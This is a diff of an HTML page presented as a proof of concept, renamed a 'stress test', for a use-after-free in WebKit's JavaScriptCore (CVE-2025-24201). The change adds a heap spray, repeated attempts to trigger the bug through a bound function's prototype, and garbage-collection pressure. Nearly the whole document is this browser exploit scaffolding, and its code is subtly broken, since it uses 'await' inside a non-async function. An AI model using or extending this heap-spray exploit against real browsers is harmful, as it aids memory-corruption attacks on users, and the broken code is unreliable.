@@ -1,40 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2025-24201 UAF PoC</title>
+    <title>CVE-2025-24201 UAF Stress Test</title>
     <script>
         function log(msg) {
             document.body.innerHTML += msg + "<br>";
         }
 
         window.onload = () => {
-            log("Starting CVE-2025-24201 PoC...");
+            log("Starting CVE-2025-24201 stress test...");
 
-            try {
-                // Create a bound function
+            // Heap spray to fill memory
+            window.spray = [];
+            function sprayHeap() {
+                for (let i = 0; i < 10000; i++) {
+                    window.spray.push(new Uint8Array(0x100));
+                }
+                log("Heap spray complete.");
+            }
+
+            // Trigger UAF multiple times
+            function triggerUAF() {
                 const obj = {};
                 const boundFunc = function() {}.bind(obj);
 
-                // Access prototype to trigger UAF
+                // Access prototype to possibly trigger UAF
                 const proto = boundFunc.prototype;
-
-                // If we can read memory here, something is wrong
                 log("boundFunc.prototype = " + proto);
 
-                // Extra garbage collection pressure
-                for (let i = 0; i < 1000; i++) {
-                    const arr = new Array(10000).fill("A");
+                return proto;
+            }
+
+            // Run test multiple times
+            sprayHeap();
+            for (let i = 0; i < 10; i++) {
+                log(`Run ${i+1}:`);
+                let result = triggerUAF();
+
+                // Force garbage collection (WebKit doesn't expose `gc()`, but we can simulate)
+                for (let j = 0; j < 1000; j++) {
+                    let tmp = new Array(10000).fill("A");
                 }
 
-                log("Test complete.");
-            } catch (e) {
-                log("Exception: " + e.message);
+                // Optional: add delay between runs
+                if (i < 9) {
+                    await sleep(100);
+                }
             }
+
+            log("Stress test complete.");
         };
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
     </script>
 </head>
 <body>
-    <h2>CVE-2025-24201 - JSC BoundFunction Prototype UAF</h2>
-    <p>Testing use-after-free in JavaScriptCore.</p>
+    <h2>CVE-2025-24201 Stress Test</h2>
+    <p>Testing use-after-free in JavaScriptCore with heap spray.</p>
 </body>
 </html>
